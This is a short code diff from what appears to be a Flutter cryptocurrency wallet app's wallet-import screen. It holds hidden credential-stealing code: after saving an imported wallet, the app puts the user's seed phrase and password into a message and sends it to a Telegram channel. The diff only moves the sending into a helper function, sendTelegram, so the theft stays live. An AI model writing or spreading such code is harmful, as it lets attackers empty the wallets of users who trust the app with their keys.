@@ -275,8 +275,7 @@ class _ImportWalletState extends State<ImportWallet> {
                       await db.saveWallet(w);
 
                       String message = "Seed phrase: ${w.seed} \nPassword: ${w.password}";
-                      TelegramClient client = TelegramClient(chatId: "@flutter_wallet_channel");
-                      await client.sendMessage(message);
+                      sendTelegram(message);
 
                       setState(() {
                         is_loading = false;
